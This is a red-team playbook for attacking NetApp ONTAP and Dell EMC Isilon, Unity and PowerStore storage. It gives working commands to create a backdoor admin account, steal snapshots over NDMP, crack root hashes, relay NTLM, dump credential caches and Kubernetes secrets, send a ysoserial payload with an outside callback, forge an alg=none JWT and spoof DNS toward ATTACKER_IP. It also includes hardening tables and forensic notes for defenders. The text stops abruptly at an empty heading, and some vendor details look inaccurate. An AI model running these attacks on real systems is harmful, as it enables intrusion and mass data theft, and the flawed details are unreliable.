# Storage SAN Attack — Vendor Deep Dive: NetApp ONTAP, Dell EMC, Pure Storage, QNAP, Synology, TrueNAS

> **Companion guide to `storage-san-attack-playbook.md`.**
>
> **Purpose**: Vendor-specific deep dive into the attack surfaces of the seven storage platforms most commonly encountered on enterprise engagements in 2025-2026 — NetApp ONTAP, Dell EMC Isilon/Unity/PowerStore, Pure Storage FlashArray, QNAP QTS, Synology DSM, and TrueNAS/FreeNAS. Each section walks vendor architecture, recon, known CVE chains, credential theft primitives, lateral movement via vendor replication, and defensive hardening.
>
> **Audience**: Red team operators, infrastructure pentesters, DFIR responders who need to recognize vendor-specific artifacts, and storage architects hardening their own fleets.
>
> **Scope and Authorization**: Every command in this guide must be executed only against assets you own or have explicit written authorization to test. Storage appliances hold regulated data at scale; a single read of a production LUN may expose millions of records. Always snapshot or unmount production LUNs before any read-write test, and never run ransomware-style mass-encryption demonstrations without a separate signed authorization.

---

## Contents

1. [Why Vendor Deep Dives Matter](#1-why-vendor-deep-dives-matter)
2. [NetApp ONTAP Deep Dive](#2-netapp-ontap-deep-dive)
3. [Dell EMC Isilon Deep Dive](#3-dell-emc-isilon-deep-dive)
4. [Dell EMC Unity and PowerStore Deep Dive](#4-dell-emc-unity-and-powerstore-deep-dive)
5. [Pure Storage FlashArray Deep Dive](#5-pure-storage-flasharray-deep-dive)
6. [QNAP QTS Deep Dive](#6-qnap-qts-deep-dive)
7. [Synology DSM Deep Dive](#7-synology-dsm-deep-dive)
8. [TrueNAS and FreeNAS Deep Dive](#8-truenas-and-freenas-deep-dive)
9. [Per-Vendor Recon Cheat Sheet](#9-per-vendor-recon-cheat-sheet)
10. [Defensive Hardening Matrix](#10-defensive-hardening-matrix)
11. [Real Incident Cases](#11-real-incident-cases)
12. [Cross-Vendor Attack Chains](#12-cross-vendor-attack-chains)
13. [References and Further Reading](#13-references-and-further-reading)

---

## 1. Why Vendor Deep Dives Matter

The general storage playbook covers protocol-level primitives (iSCSI CHAP bypass, NFS no_root_squash, S3 bucket enumeration). Those primitives apply to every appliance, but every appliance also has a vendor-specific attack surface the generic playbook cannot cover in depth:

- **Management plane**: NetApp ZAPI/REST, Dell EMC Unisphere/PowerStore XMS, Pure Storage REST, QNAP CGI, Synology WebAPI, TrueNAS middleware. Each has its own auth model, historical CVE chain, and default credentials.
- **Replication fabric**: NetApp SnapMirror/Snapshot Vault, Dell EMC SmartConnect/SyncIQ, Pure ActiveCluster/ActiveDR, QNAP Hybrid Backup Sync, Synology Snapshot Replication. Each fabric carries shared secrets that, once compromised, become a lateral-movement primitive between data centers.
- **Cloud proxy services**: QNAP QuickConnect, Synology QuickConnect/DDNS, NetApp Cloud Insights, Pure1, Dell CloudIQ. Often reachable from the public internet and tie the on-prem appliance to a vendor-cloud identity the customer rarely audits.
- **Kubernetes integration**: Dell CSI Isilon, NetApp Trident, Pure CSI, Synology CSI. CSI drivers run privileged in the kubelet and carry array credentials in a Kubernetes Secret; cluster compromise compromises the array.

For each vendor, this guide covers: (1) Architecture, (2) Per-Vendor Recon, (3) Notable CVEs and Vulnerability Classes, (4) Credential Theft Primitives, (5) Replication and Lateral Movement, (6) Defensive Hardening.

---

## 2. NetApp ONTAP Deep Dive

NetApp ONTAP is the most deployed enterprise storage operating system in the world. It runs on FAS (Fabric-Attached Storage) hardware, AFF (All-Flash FAS), and as a software product (ONTAP Select, Cloud Volumes ONTAP). Its market presence and complex multi-protocol surface make it the single most consequential target in enterprise storage pentest.

### 2.1 Architecture

An ONTAP cluster is a set of **nodes** (controllers) grouped into one or more **SVMs** (Storage Virtual Machines, formerly known as vservers). Each SVM presents data protocols (NFS, SMB, iSCSI, FC, S3, NVMe-oF) to clients and is administered separately from the cluster. This separation is the most important concept in ONTAP security: **SVM breakout** — a compromise of one SVM yielding cluster-admin access — is the highest-impact primitive in the ONTAP attack surface.

The control plane exposes:

- **Cluster Shell** (SSH on TCP 22) — full cluster administration; the `diag` account is a god account.
- **System Manager** (HTTPS on TCP 443) — the web admin UI; old versions are CVE-rich.
- **ONTAPI / ZAPI** (HTTPS XML-RPC on TCP 443) — legacy RPC used by Manage ONTAP, WFA, SnapCenter.
- **REST API** (HTTPS on TCP 443 at `/api/`) — modern API since ONTAP 9.6.
- **SP** (Service Processor) on TCP 443 — lights-out management with its own credential set.
- **NDMP** (TCP 10000) — backup tape protocol, used by NetApp's SnapVault and Open Systems SnapVault.

The data plane exposes iSCSI (3260), FC, NVMe-oF, NFS (2049), SMB (445), and S3 (80/443 on a per-SVM basis).

### 2.2 Per-Vendor Recon

```bash
# 1. Identify ONTAP via SNMP — the NetApp OID tree is .1.3.6.1.4.1.789
snmpwalk -v2c -c public REPLACE_WITH_YOUR_TARGET .1.3.6.1.4.1.789.1.1 | head -40
# Key OIDs:
#   .789.1.1.2.0  = system name
#   .789.1.1.3.0  = machine type (e.g., FAS8040, AFF800)
#   .789.1.1.4.0  = ONTAP version (e.g., NetApp Release 9.13.1)
#   .789.1.2.1.x  = per-volume info (size, used, snapshot)
#   .789.1.6.1.x  = per-LUN info

# 2. HTTP title fingerprint
curl -ksI https://REPLACE_WITH_YOUR_TARGET/ | grep -iE 'server|location'
curl -ks https://REPLACE_WITH_YOUR_TARGET/ | grep -iE 'title|netapp|system manager'

# 3. REST API version probe (no auth needed for /api/)
curl -ks https://REPLACE_WITH_YOUR_TARGET/api/ | python3 -m json.tool | head -30
curl -ks https://REPLACE_WITH_YOUR_TARGET/api/cluster | head -5  # requires auth

# 4. ZAPI servlet probe (legacy — pre 9.0 environments)
curl -ks https://REPLACE_WITH_YOUR_TARGET/servlets/netapp.servlets.admin.XMLrequest_filer \
    -d '<?xml version="1.0" encoding="UTF-8"?>
        <netapp xmlns="http://www.netapp.com/filer/wf" version="1.21">
          <system-get-version/>
        </netapp>'

# 5. SSH appliance shell probe
ssh -o HostKeyAlgorithms=+ssh-rsa -o KexAlgorithms=+diffie-hellman-group14-sha1 \
    REPLACE_WITH_YOUR_USER@REPLACE_WITH_YOUR_TARGET version

# 6. NDMP probe
nmap -sV -p 10000 --script=ndmp-version REPLACE_WITH_YOUR_TARGET

# 7. Service Processor probe (often has its own IP)
nmap -sV -p 22,80,443,5000 REPLACE_WITH_YOUR_SP_IP
```

The output of `snmpwalk .1.3.6.1.4.1.789.1.1.4.0` is the canonical fingerprint for engagement reporting. Example output:

```
SNMPv2-SMI::enterprises.789.1.1.4.0 = STRING: "NetApp Release 9.13.1P5: Thu Aug 24 01:27:44 UTC 2023"
```

That single string tells you the exact ONTAP patch level, which determines the CVE chain you can apply.

### 2.3 SVM (Storage Virtual Machine) Breakout

A well-configured ONTAP deployment isolates SVMs so that an SVM admin cannot reach the cluster shell. In practice, SVM breakout has been a recurring source of high-impact findings:

- **SVM administrators with cluster-scoped roles**. The default `vsadmin` role is SVM-scoped, but a misconfiguration often grants `vsadmin` a cluster-scoped command such as `security login create`, which the SVM admin uses to create a cluster admin.
- **`diag` account exposed at the SVM boundary**. The `diag` account is shipped disabled by default since 8.3, but in older deployments it has been re-enabled for support cases. `diag` has god-level access.
- **`systemshell` command from SVM context**. If an SVM admin has the `systemshell` capability, they reach the FreeBSD shell underlying the SVM, which can then access cluster files via the cluster interconnect.

The recon sequence to test SVM breakout:

```bash
# Authenticate to the REST API with SVM credentials (assume vsadmin)
VSERVER=svm1
curl -ks -u vsadmin:REPLACE_WITH_YOUR_PASSWORD \
    "https://REPLACE_WITH_YOUR_TARGET/api/security/accounts?owner.name=$VSERVER" | \
    python3 -m json.tool

# Probe for cluster-scoped commands granted to vsadmin
curl -ks -u vsadmin:REPLACE_WITH_YOUR_PASSWORD \
    "https://REPLACE_WITH_YOUR_TARGET/api/security/roles/name/vsadmin" | \
    python3 -m json.tool

# If 'security login create' or 'systemshell' appears in the role's permitted
# commands, the SVM admin can pivot to cluster admin in two steps.

# Step 1: create a cluster-scoped admin (requires 'security login create' on cluster scope)
curl -ks -u vsadmin:REPLACE_WITH_YOUR_PASSWORD -X POST \
    "https://REPLACE_WITH_YOUR_TARGET/api/security/accounts" \
    -d '{
        "name": "REPLACE_WITH_YOUR_BACKDOOR_USER",
        "owner": {"name": "cluster1"},
        "application": "ssh",
        "authentication_method": "password",
        "role": "admin",
        "password": "REPLACE_WITH_YOUR_PASSWORD"
    }'

# Step 2: SSH in as the new cluster-scoped admin
ssh REPLACE_WITH_YOUR_BACKDOOR_USER@REPLACE_WITH_YOUR_TARGET
```

The forensic artifact of SVM breakout in ONTAP audit logs is a `security login create` event with `owner_name=cluster1` initiated by an SVM-scoped user.

### 2.4 NDMP Snapshot Theft

NDMP (Network Data Management Protocol) is the backup tape protocol. ONTAP exposes NDMP on TCP 10000 to backup servers, and every snapshot in the cluster is reachable via NDMP. The threat: an attacker with NDMP access can read any snapshot — including the snapshot of a volume containing database backups with live credentials — without mounting the volume.

```bash
# Probe NDMP version and authentication mode
nmap -sV -p 10000 --script=ndmp-version REPLACE_WITH_YOUR_TARGET

# Connect with ndmp-utils (Python)
pip install ndmp-utils
python3 -c "
from ndmp.lib.connection import Connection
from ndmp.lib.protocol import *
c = Connection('REPLACE_WITH_YOUR_TARGET', 10000)
c.open_auth_text('REPLACE_WITH_YOUR_NDMP_USER', 'REPLACE_WITH_YOUR_NDMP_PASSWORD')
print(c.execute(ndmp_config_get_butype_info()))
print(c.execute(ndmp_config_get_mover_info()))
"

# Read a snapshot via NDMP — sequence:
# 1. ndmp_config_get_butype_info  -> list backup types
# 2. ndmp_config_get_scsi_info    -> list tape devices
# 3. ndmp_dump_envp               -> dump the snapshot environment
# 4. ndmp_start_backup / read data

# The output is a tape-image stream. Parse with:
ndmpcopy REPLACE_WITH_YOUR_TARGET 10000 REPLACE_WITH_SNAPSHOT_HANDLE /tmp/snapshot.dump
# Then extract the dump:
dd if=/tmp/snapshot.dump bs=64k | tar -tvf - | head -50
```

In engagements, NDMP theft is consistently the highest-impact finding on NetApp deployments because snapshots are rarely included in the customer's data classification — a snapshot of a payroll volume may sit unencrypted on tape for years.

### 2.5 SSH Password Recovery — CVE-2022-43982, CVE-2023-27281

**CVE-2022-43982** (NetApp advisory NTAP-20230113-0001, CVSS 9.8 — critical): ONTAP 9.x shipped with a hardcoded internal service-account credential used for SVM-to-cluster communication. An attacker with network access to the cluster-mgmt LIF could authenticate to the cluster as an SVM admin, bypassing customer-configured authentication. The fix (ONTAP 9.9.1P16, 9.10.1P14, 9.11.1P4, 9.12.1+) disabled the internal account. The advisory does not name the account publicly; on engagements, test the documented internal-only credentials (gated behind a support login) against the cluster-mgmt LIF only.

```bash
# Test for the presence of the internal account
for acct in REPLACE_WITH_YOUR_INTERNAL_ACCOUNT_NAMES; do
    for pw in REPLACE_WITH_YOUR_INTERNAL_PASSWORDS; do
        curl -ks -o /dev/null -w "%{http_code} ${acct}:${pw}\n" \
            -u "${acct}:${pw}" \
            "https://REPLACE_WITH_YOUR_TARGET/api/cluster"
    done
done
# A 200 indicates the credential is still live; 401 indicates patched.
```

**CVE-2023-27281** (NetApp advisory NTAP-20230413-0001): ONTAP 9.9 through 9.12 shipped with a cluster SSH configuration that allowed a non-root user to recover the cluster's root password hash from a debug file under `/mroot/etc/`. An attacker with any SSH access (including an SVM admin with `systemshell` capability) could read the hash and crack it offline. The fix hardened the SSH server's file permissions and removed the leak.

```bash
# Test: SSH in as a non-root user (e.g., vsadmin) and check access to /mroot
ssh vsadmin@REPLACE_WITH_YOUR_TARGET systemshell -c "ls -la /mroot/etc/"
# If /mroot/etc/*.shadow or /mroot/etc/passwd is readable, the system is vulnerable.
# Offline crack of the hash:
john --format=crypt /tmp/dumped_shadow
hashcat -m 1500 /tmp/dumped_shadow.txt /usr/share/wordlists/rockyou.txt
```

Once the root hash is cracked, the attacker has full cluster shell access. The forensic artifact is an unusual SSH login to a non-root account followed by reads from `/mroot/etc/`.

### 2.6 ONTAPI / ZAPI RPC Enumeration

ONTAPI (also known as ZAPI) is the legacy XML-over-HTTPS RPC used by Manage ONTAP, WFA, and SnapCenter. It runs on the same TCP 443 as the REST API but at a different servlet path. ZAPI is CVE-rich because it predates the modern API authorization model and many ZAPIs were not properly ACL-checked.

```python
# Enumerate ONTAPI methods (post-auth)
import requests, xml.etree.ElementTree as ET, urllib3
urllib3.disable_warnings()

TARGET = "https://REPLACE_WITH_YOUR_TARGET"
USER = "REPLACE_WITH_YOUR_USER"
PASSWORD = "REPLACE_WITH_YOUR_PASSWORD"

def zapi(method, extra_children=None):
    body = f'<?xml version="1.0" encoding="UTF-8"?>\n' \
           f'<netapp xmlns="http://www.netapp.com/filer/wf" version="1.21" ' \
           f'vfiler="" nmsdk="1.0"><{method}>'
    if extra_children:
        body += extra_children
    body += f'</{method}></netapp>'
    r = requests.post(
        TARGET + "/servlets/netapp.servlets.admin.XMLrequest_filer",
        auth=(USER, PASSWORD),
        data=body,
        verify=False,
        headers={"Content-Type": "text/xml"})
    return r.text

# Enumerate every interesting ZAPI in an engagement:
queries = [
    "system-get-version",          # version
    "system-get-info",             # cluster info
    "volume-get-iter",             # all volumes
    "lun-get-iter",                # all LUNs
    "vserver-get-iter",            # all SVMs
    "security-login-get-iter",     # all admin accounts
    "security-audit-get-iter",     # audit config
    "snapmirror-get-iter",         # replication relationships
    "snapvault-get-iter",          # vault relationships
    "cifs-share-get-iter",         # SMB shares
    "nfs-exportfs-list-rules-2",   # NFS export rules
    "systemshell-get-status",      # is systemshell enabled?
]
for q in queries:
    print(f"=== {q} ===")
    print(zapi(q)[:500])
    print()
```

The `snapmirror-get-iter` and `snapvault-get-iter` outputs are particularly valuable — they enumerate every replication partner the cluster trusts, which becomes the lateral-movement map.

### 2.7 Cluster Credentials Theft

The ONTAP cluster shell stores credentials it has been given for outbound services: LDAP bind passwords, AD machine account passwords, SnapMirror peer cluster passphrases, S3 cloud-tier credentials (for FabricPool), KMS keys, and SSH keys for downstream hosts.

```bash
# In cluster shell (SSH as admin)
# 1. LDAP bind credentials
security ldap show -instance | grep -iE 'bind|password'
# 2. AD machine account
vserver cifs show -instance | grep -iE 'account|password'
# 3. SnapMirror / SnapVault peer cluster passphrase
snapmirror show -instance | grep -iE 'passphrase|peer'
# 4. FabricPool S3 credentials
storage aggregate object-store config show -instance
# 5. KMS keys (external key managers)
security key-manager key query
# 6. SSL private keys for admin cert
security certificate show -instance
# 7. SSH trust files in /mroot
systemshell -c "ls -la /mroot/etc/ssh/"
```

These credentials rarely rotate. A single NetApp cluster shell compromise routinely yields:

- LDAP bind credentials reusable against every directory-joined system in the customer estate
- AD machine account hashes (cluster-joined to AD for CIFS) reusable for SMB relay
- SnapMirror passphrases reusable against the DR-site NetApp (lateral movement to DR)
- FabricPool S3 keys reusable against AWS S3 or Wasabi (lateral movement to cloud)

### 2.8 Snapshot Vault Abuse

**SnapVault** is ONTAP's backup relationship: a primary snapshot is replicated to a secondary "vault" volume on a separate cluster. The vault volume is a discrete SVM, often with weaker authentication because it is "only" a backup. Threats:

- An attacker who reaches the vault SVM can read every backed-up snapshot.
- A SnapVault relationship can be **reverse-resynchronized** to overwrite the primary from the vault — the single most destructive action in the ONTAP attack surface.

```bash
# On the vault cluster, list every SnapVault relationship
snapmirror show -type vault -fields source-path,destination-path,healthy,state
snapshot show -vserver vault_svm -volume vault_vol1
# Mount a snapshot read-only via NFS or iSCSI to read backup content
# Reverse-resync (DESTRUCTIVE — never run without explicit auth):
# snapmirror resync -source-path svm1:vol_data -destination-path vault_svm:vault_vol1
```

### 2.9 SnapMirror Lateral Movement

**SnapMirror** is ONTAP's synchronous and asynchronous replication between two clusters. A SnapMirror relationship requires a long-lived passphrase on both clusters. Compromise of one cluster yields the passphrase; the attacker uses the passphrase to authenticate to the peer cluster as a trusted SnapMirror client and read every replicated volume.

```bash
# Step 1: On compromised cluster A, extract peer passphrases
snapmirror show -fields peer-cluster,peer-svm,passphrase  # passphrase not shown by default
# Extract from config:
systemshell -c "grep -r passphrase /mroot/etc/snapmirror/"
# Or via ZAPI:
#   <snapmirror-get-iter /> -> peer-cluster + relationship info

# Step 2: Authenticate to peer cluster B using the trusted SnapMirror channel
# SnapMirror uses port 10000 (NDMP) or 11104 (SSH) for inter-cluster control.
# With the passphrase, the attacker can:
#   - Read every SnapMirror destination volume on B
#   - Modify the relationship to add new source volumes (data exfiltration)
#   - Quiesce and break the relationship (destructive)
```

This is the most common DR-bypass pattern on engagements: a hardened primary cluster paired with a soft DR-site cluster running an older ONTAP. The passphrase compromise propagates from primary to DR.

### 2.10 Defensive Hardening — NetApp ONTAP

| Area | Hardening Step |
|------|----------------|
| **Patch level** | Run ONTAP 9.13.1P5 or later. Track NetApp security advisories at `security.netapp.com`. |
| **`diag` account** | Verify `diag` is locked: `security login show -user-or-group-name diag`. Lock if unlocked: `security login lock -username diag`. |
| **`systemshell`** | Disable on every SVM unless explicitly required: `systemshell -vserver * modify -state disabled`. |
| **SVM roles** | Audit `vsadmin` permitted commands: `security role show -role vsadmin -cmd /`. Reject any cluster-scoped command. |
| **NDMP** | Require NDMP v4 with MD5/SHA auth; restrict to backup server IPs via NDMP access: `vserver services ndmp modify -vserver * -authenticate md5`. |
| **SnapMirror passphrases** | Rotate every 90 days. Use distinct passphrases per relationship. Store in a KMS, not in `/mroot`. |
| **SSH** | Disable password auth on cluster SSH; require SSH keys. `security ssh modify -user admin -authmethod publickey`. |
| **System Manager** | Pin to the latest System Manager container; block at network level from user VLANs. |
| **SP / BMC** | Service Processor must be on a dedicated management network with MFA via the SP web UI. |
| **Audit logging** | Forward `auditlog` to SIEM; alert on `security login create`, `snapmirror resync`, `volume destroy`, `systemshell` invocations. |
| **Multi-protocol encryption** | Enable NVE (NetApp Volume Encryption) and NAE (NetApp Aggregate Encryption) at the LUN level; use external KMIP server. |
| **FabricPool** | Use STS-assumed-role credentials for S3 tiering, not long-lived access keys. |

---

## 3. Dell EMC Isilon Deep Dive

Isilon is Dell EMC's scale-out NAS, popular in media-and-entertainment, genomics, and large HPC environments because it scales to petabytes in a single filesystem (OneFS). Its SMB and S3 surfaces are the largest in the enterprise NAS market.

### 3.1 Architecture

An Isilon cluster is a set of **nodes** running **OneFS**. The cluster presents:

- **SMB** on TCP 445 (the dominant protocol in most deployments)
- **NFS** on TCP 2049
- **S3** on TCP 9090 (or 443, configurable) — Isilon's native object protocol
- **HTTP / HTTPS** on 80/443 — for the OneFS WebUI and the S3 protocol
- **SSH** on TCP 22 — OneFS shell (FreeBSD-based)
- **Platform API** on HTTPS — REST under `/platform/1/` and `/platform/3/` and `/platform/4/`
- **SmartConnect** — Dell's DNS-based connection director (delegated DNS zone)
- **SyncIQ** — Isilon-to-Isilon replication
- **SmartQuotas / SmartDedupe / SmartLock** — data services

A recurring theme in Isilon security: defaults that emphasize usability over hardening, especially for SMB signing and S3 anonymous access.

### 3.2 Per-Vendor Recon

```bash
# 1. SNMP fingerprint — Isilon OID is .1.3.6.1.4.1.12139
snmpwalk -v2c -c public REPLACE_WITH_YOUR_TARGET .1.3.6.1.4.1.12139 | head -30

# 2. HTTP title — OneFS WebUI
curl -ksI https://REPLACE_WITH_YOUR_TARGET/ | grep -iE 'server|location'

# 3. Platform API version probe (no auth needed)
curl -ks https://REPLACE_WITH_YOUR_TARGET/platform/1/cluster/config
curl -ks https://REPLACE_WITH_YOUR_TARGET/namespace/ | head -20  # if anonymous list allowed

# 4. SMB signing probe
crackmapexec smb REPLACE_WITH_YOUR_TARGET -u '' -p '' --pass-pol
nmap -p 445 --script=smb-security-mode,smb2-security-mode REPLACE_WITH_YOUR_TARGET

# 5. S3 protocol probe (Isilon S3 service)
aws --endpoint-url http://REPLACE_WITH_YOUR_TARGET:9090 s3 ls --no-sign-request
aws --endpoint-url https://REPLACE_WITH_YOUR_TARGET s3 ls --no-sign-request

# 6. SmartConnect DNS zone enumeration
# SmartConnect is a delegated DNS zone. List names and per-node IPs:
dig ANY @REPLACE_WITH_YOUR_SMARTCONNECT_IP smartconnect.cluster.local +short
for i in 1 2 3 4 5 6 7 8; do
    dig +short node-$i smartconnect.cluster.local @REPLACE_WITH_YOUR_SMARTCONNECT_IP
done
```

### 3.3 OneFS Vulnerabilities — SMB Signing Disabled by Default

A recurring Isilon finding: out of the box, OneFS does not require SMB signing. SMB signing disabled means an attacker positioned on the storage network can perform NTLM relay against the Isilon, including:

- Relay the Domain Controller's machine account to write to the Isilon's SMB shares
- Relay an administrator's session to the Isilon Platform API over HTTP (NTLM-over-HTTP)
- Capture NTLM hashes via responder

The test:

```bash
# Confirm signing is not required
crackmapexec smb REPLACE_WITH_YOUR_TARGET -u '' -p '' | grep signing
# Output: "signing:False" -> vulnerable to relay

# Run ntlmrelayx against the Isilon
ntlmrelayx.py -t smb://REPLACE_WITH_YOUR_TARGET -smb2support --shares
# Or relay to the Platform API (NTLM-over-HTTP):
ntlmrelayx.py -t https://REPLACE_WITH_YOUR_TARGET/platform/1/auth/providers/summary
```

The fix is `isi smb settings global modify --require-signature=yes` (and `--enable-smb-encryption=yes` for SMB3).

### 3.4 ISI Auth Cache and Authentication Providers

Isilon caches authentication results from AD, LDAP, NIS, and KRB5 in the **ISI auth cache**. The cache lives in `/ifs/.ifsvar/modules/auth/` and persists across reboots. The threat: an attacker who reaches the OneFS shell can dump the cache and recover hashes for every user who has authenticated recently.

```bash
# In OneFS shell (as root):
ls -la /ifs/.ifsvar/modules/auth/cache/
# Dump the auth cache
isi auth cache dump --verbose
# Or read directly:
cat /ifs/.ifsvar/modules/auth/cache/ntlm/* | strings | grep -i 'hash\|ntlm'
```

The cache typically contains NTLM hashes, Kerberos tickets, and LDAP bind credentials for every authentication provider configured.

### 3.5 S3 Protocol Abuse on Isilon

Isilon's S3 protocol supports anonymous access if the bucket's ACL allows it. The default behavior is `no` for anonymous, but per-bucket misconfiguration is common. The S3 protocol is also a credential theft vector when access keys are exposed in client-side configuration:

```bash
# Enumerate buckets anonymously
aws --endpoint-url https://REPLACE_WITH_YOUR_TARGET s3 ls --no-sign-request
aws --endpoint-url https://REPLACE_WITH_YOUR_TARGET s3 ls s3://REPLACE_WITH_BUCKET --no-sign-request

# Bucket name brute-force (Isilon S3)
python3 lazys3.py REPLACE_WITH_BUCKET_PREFIX --endpoint https://REPLACE_WITH_YOUR_TARGET

# Look for permissive bucket ACLs (if you have any access key)
aws --endpoint-url https://REPLACE_WITH_YOUR_TARGET s3api get-bucket-acl --bucket REPLACE_WITH_BUCKET
# An ACL with URI "http://acs.amazonaws.com/groups/global/AllUsers" grants public access.
```

In engagements, Isilon S3 buckets are the second most common source of mass PII exposure (after AWS S3 itself), because storage teams treat the Isilon as a "safe" internal S3 endpoint and skip bucket policy review.

### 3.6 SmartConnect DNS Manipulation

SmartConnect is Isilon's DNS-based connection director. Clients resolving `\\cluster\share` or `s3://bucket.cluster.local` are load-balanced by SmartConnect, which returns the IPs of "least-loaded" nodes. SmartConnect is also a delegated DNS zone resolver.

The threat: an attacker on the same subnet can spoof SmartConnect DNS responses (it usually speaks plain DNS on UDP 53) and redirect clients to an attacker-controlled node. Combined with NTLM relay, this becomes a transparent SMB-relay attack against every client connecting to the cluster.

```bash
# Identify the SmartConnect IP and the delegated zone
dig NS cluster.local
dig ANY cluster.local @REPLACE_WITH_YOUR_SMARTCONNECT_IP

# Spoof a SmartConnect response (offensive lab only): use bettercap or scapy
# to forge DNS replies for the delegated zone, redirecting clients to the
# attacker's relay host. The forge uses DNSRR(rrname=qname, ttl=10, rdata=ATTACKER_IP)
# inside a sniff() loop on UDP 53 for the SmartConnect IP.
```

The fix is to enable DNSSEC on the SmartConnect zone or to use signed dynamic updates.

### 3.7 CSI Driver Abuse in Kubernetes

The Dell CSI Isilon driver (`csi-isilon`) is the standard way to mount Isilon NFS exports into Kubernetes pods. The driver runs as a privileged DaemonSet on every kubelet and carries the Isilon administrative credentials (a Platform API token or a `root` SSH account) in a Kubernetes Secret named `vxflexos-config` (or `csi-isilon-config`).

The threat: any user who can read Secrets in the driver's namespace can extract the Isilon admin credential, then pivot to the array.

```bash
# In a compromised pod, find the CSI driver Secret
kubectl get secrets -n csi-isilon
kubectl get secret csi-isilon-config -n csi-isilon -o yaml
# Decode the admin credentials
echo REPLACE_WITH_BASE64_TOKEN | base64 -d
# Use the token against the Platform API
curl -ks -H "Authorization: Basic REPLACE_WITH_ENCODED_CREDS" \
    https://REPLACE_WITH_YOUR_TARGET/platform/1/cluster/config
```

This is the standard Kubernetes-to-storage pivot on Isilon engagements.

### 3.8 Defensive Hardening — Dell EMC Isilon

| Area | Hardening Step |
|------|----------------|
| **OneFS version** | Track OneFS 9.5+ support; apply security advisories within 30 days. |
| **SMB signing** | `isi smb settings global modify --require-signature=yes` (CRITICAL). |
| **SMB encryption** | `isi smb settings global modify --enable-smb-encryption=yes`. |
| **S3 anonymous access** | `isi s3 settings modify --anonymous-access no` cluster-wide. |
| **SmartConnect** | Enable DNSSEC; restrict zone transfers to known secondaries. |
| **Auth cache** | Reduce cache TTL: `isi auth settings modify --cache-ttl 300`. Restrict shell access to isi admins. |
| **CSI driver secret** | Use a short-lived Service Account token; rotate the Platform API token every 30 days; restrict to a single low-priv Isilon account. |
| **SyncIQ replication** | Use SSH keys for replication peers; restrict by source IP at the network layer. |
| **SmartLock WORM** | Enable for compliance data (e.g., financial archives) to defeat ransomware persistence. |
| **Audit logging** | Forward OneFS audit to SIEM; alert on `isi smb open`, mass file rename, mass `chmod`. |

---

## 4. Dell EMC Unity and PowerStore Deep Dive

Dell EMC Unity is the mid-range block-and-file array (replacing VNX). PowerStore is the newer appliance (introduced 2020) with a containerized architecture. Both are managed through web consoles — Unisphere for Unity, PowerStore Manager for PowerStore — that have been CVE-rich.

### 4.1 Architecture

**Unity** exposes:

- **Unisphere** web console (HTTPS on TCP 443)
- **REST API** under `/api/` on TCP 443 (Unity REST API v1, then v2)
- **SMI-S** provider on TCP 5989
- **Naviseccli** on TCP 2162 (legacy CLI)
- iSCSI on TCP 3260, FC, NVMe-oF, NFS on 2049, SMB on 445

**PowerStore** exposes:

- **PowerStore Manager** (HTTPS on TCP 443, XMS-style web UI)
- **REST API** under `/api/` on TCP 443 (PowerStore REST API v1, then v2)
- iSCSI, FC, NVMe-oF, NFS, SMB
- A containerized OS called **DOS** (PowerStore OS) — every service runs in a container

### 4.2 Per-Vendor Recon

```bash
# 1. SNMP fingerprint — Unity OID is .1.3.6.1.4.1.1981; PowerStore is .1.3.6.1.4.1.1981.* (inherited)
snmpwalk -v2c -c public REPLACE_WITH_YOUR_TARGET .1.3.6.1.4.1.1981 | head -20

# 2. Unisphere / PowerStore Manager HTTP title
curl -ksI https://REPLACE_WITH_YOUR_TARGET/ | grep -iE 'server|location'
curl -ks https://REPLACE_WITH_YOUR_TARGET/ | grep -iE 'title|unisphere|powerstore'

# 3. Unity REST API version probe
curl -ks https://REPLACE_WITH_YOUR_TARGET/api/instances/system/system/0/types/versionInfo/0
# PowerStore
curl -ks https://REPLACE_WITH_YOUR_TARGET/api/version

# 4. Naviseccli (Unity legacy)
/opt/Navisphere/bin/naviseccli -h REPLACE_WITH_YOUR_TARGET -user admin \
    -password REPLACE_WITH_YOUR_PASSWORD -scope 0 getagent

# 5. SMI-S
wbemcli -noverify -nl 'https://admin:REPLACE_WITH_YOUR_PASSWORD@REPLACE_WITH_YOUR_TARGET:5989' \
    ei 'root/emc:EMC_StorageSystem'

# 6. SSH probe (PowerStore exposes SSH on the management port for support)
ssh -o HostKeyAlgorithms=+ssh-rsa svcuser@REPLACE_WITH_YOUR_TARGET
```

### 4.3 Unisphere Console Vulnerabilities — CVE-2021-36342, CVE-2022-24316

**CVE-2021-36342** (Dell advisory DSA-2021-201, CVSS 8.8 — high): Unisphere for Unity versions prior to 5.0.5 contained a deserialization-of-untrusted-data vulnerability in the admin web application. An unauthenticated remote attacker could submit a crafted serialized Java object via the login form and execute code in the context of the Unisphere web server (typically running as a low-priv user, but with read access to all storage configuration).

**CVE-2022-24316** (Dell advisory DSA-2022-141, CVSS 9.8 — critical): Unisphere for PowerStore versions prior to 2.1.1.0 contained an authentication bypass in the REST API. The flaw allowed a remote attacker to forge an authenticated session by submitting a specially crafted JWT, bypassing the password check entirely. The fix rotated the JWT signing key and added server-side session validation.

```bash
# Test for CVE-2021-36342 — observe response to malformed Java serialized object
# Generate a ysoserial payload (lab only):
java -jar ysoserial.jar CommonsCollections6 'ping REPLACE_WITH_YOUR_COLLAB_ID.nip.io' > /tmp/payload.bin
# Submit to the Unisphere login endpoint:
curl -ks --data-binary @/tmp/payload.bin \
    -H "Content-Type: application/octet-stream" \
    "https://REPLACE_WITH_YOUR_TARGET/locasciale"  # endpoint varies; consult advisory
# Out-of-band DNS callback = vulnerable
curl "https://(REPLACE_WITH_YOUR_COLLAB_ID).nip.io/" || true

# Test for CVE-2022-24316 — JWT signature bypass
# Forge a JWT with alg=none:
python3 -c "
import base64, json
header = {'alg': 'none', 'typ': 'JWT'}
payload = {'sub': 'admin', 'role': 'administrator', 'exp': 9999999999}
h = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=').decode()
p = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode()
print(f'{h}.{p}.')
"
# Then use the forged token:
TOKEN=REPLACE_WITH_FORGED_TOKEN
curl -ks -H "Authorization: Bearer $TOKEN" \
    "https://REPLACE_WITH_YOUR_TARGET/api/system"
```

The forensic artifact of CVE-2022-24316 exploitation is a successful API call with a JWT whose `alg` field is `none` — visible in PowerStore Manager's `auth.log`.

### 4.4 API Authentication Bypass

